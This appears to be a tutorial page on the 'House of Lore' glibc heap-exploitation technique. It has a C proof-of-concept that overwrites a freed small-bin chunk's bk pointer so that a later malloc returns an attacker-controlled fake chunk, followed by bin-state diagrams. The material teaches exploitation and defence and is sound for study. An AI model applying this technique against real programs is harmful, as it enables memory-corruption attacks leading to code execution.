# House of Lore

This attack is basically the forging chunks attack for small and large bins. However, due to an added protection for large bins in around 2007 (the introduction of `fd_nextsize` and `bk_nextsize`) it became impractical. Here we shall see the case only for small bins. First, a small chunk will be placed in a small bin. It's `bk` pointer will be overwritten to point to a fake small chunk. Note that in the case of small bins, insertion happens at the `HEAD` and removal at the `TAIL`. A malloc call will first remove the authentic chunk from the bin making the attacker's fake chunk at the `TAIL` of the bin. The next malloc will return the attacker's chunk.

Consider this sample code (download the complete version [here](../assets/files/house_of_lore.c)):

```c
struct small_chunk {
  size_t prev_size;
  size_t size;
  struct small_chunk *fd;
  struct small_chunk *bk;
  char buf[0x64];               // chunk falls in smallbin size range
};

struct small_chunk fake_chunk;                  // At address 0x7ffdeb37d050
struct small_chunk another_fake_chunk;
struct small_chunk *real_chunk;
unsigned long long *ptr, *victim;
int len;

len = sizeof(struct small_chunk);

// Grab two small chunk and free the first one
// This chunk will go into unsorted bin
ptr = malloc(len);                              // points to address 0x1a44010

// The second malloc can be of random size. We just want that
// the first chunk does not merge with the top chunk on freeing
malloc(len);                                    // points to address 0x1a440a0

// This chunk will end up in unsorted bin
free(ptr);

real_chunk = (struct small_chunk *)(ptr - 2);   // points to address 0x1a44000

// Grab another chunk with greater size so as to prevent getting back
// the same one. Also, the previous chunk will now go from unsorted to
// small bin
malloc(len + 0x10);                             // points to address 0x1a44130

// Make the real small chunk's bk pointer point to &fake_chunk
// This will insert the fake chunk in the smallbin
real_chunk->bk = &fake_chunk;
// and fake_chunk's fd point to the small chunk
// This will ensure that 'victim->bk->fd == victim' for the real chunk
fake_chunk.fd = real_chunk;

// We also need this 'victim->bk->fd == victim' test to pass for fake chunk
fake_chunk.bk = &another_fake_chunk;
another_fake_chunk.fd = &fake_chunk;

// Remove the real chunk by a standard call to malloc
malloc(len);                                    // points at address 0x1a44010

// Next malloc for that size will return the fake chunk
victim = malloc(len);                           // points at address 0x7ffdeb37d060
```

Notice that the steps needed for forging a small chunk are more due to the complicated handling of small chunks. Particular care was needed to ensure that `victim->bk->fd` equals `victim` for every small chunk that is to be returned from 'malloc', to pass the "malloc(): smallbin double linked list corrupted" security check. Also, extra 'malloc' calls were added in between to ensure that:

1. The first chunk goes to the unsorted bin instead of merging with the top chunk on freeing.
2. The first chunk goes to the small bin as it does not satisfy a malloc request for `len + 0x10`.

The state of the unsorted bin and the small bin are shown:

1. free(ptr).
  Unsorted bin:
  > head <-> ptr <-> tail

  Small bin:
  > head <-> tail
2. malloc(len + 0x10);
  Unsorted bin:
  > head <-> tail

  Small bin:
  > head <-> ptr <-> tail
3. Pointer manipulations
  Unsorted bin:
  > head <-> tail

  Small bin:
  > undefined <-> fake_chunk <-> ptr <-> tail
4. malloc(len)
  Unsorted bin:
  > head <-> tail

  Small bin:
  > undefined <-> fake_chunk <-> tail
5. malloc(len)
  Unsorted bin:
  > head <-> tail

  Small bin:
  > undefined <-> tail         [ Fake chunk is returned ]

Note that another 'malloc' call for the corresponding small bin will result in a segmentation fault.
